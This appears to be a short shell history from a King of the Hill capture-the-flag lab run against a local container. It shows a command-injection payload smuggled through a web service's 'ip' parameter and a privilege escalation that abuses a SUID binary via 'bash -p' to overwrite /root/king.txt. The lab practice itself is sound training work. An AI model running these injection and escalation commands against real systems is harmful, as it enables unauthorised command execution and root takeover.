515 curl -s -G "http://127.0.0.1:10004/" --data-urlencode "ip=127.0.0.1; whoami"
516 docker exec koth_h1c cat /root/king.txt
517 curl -s -G "http://127.0.0.1:10004/" --data-urlencode "ip=127.0.0.1; /usr/local/bin/net-search . -exec bash -p -c 'echo Team_Izzup > /root/king.txt' {} +"
518 docker exec koth_h1c cat /root/king.txt
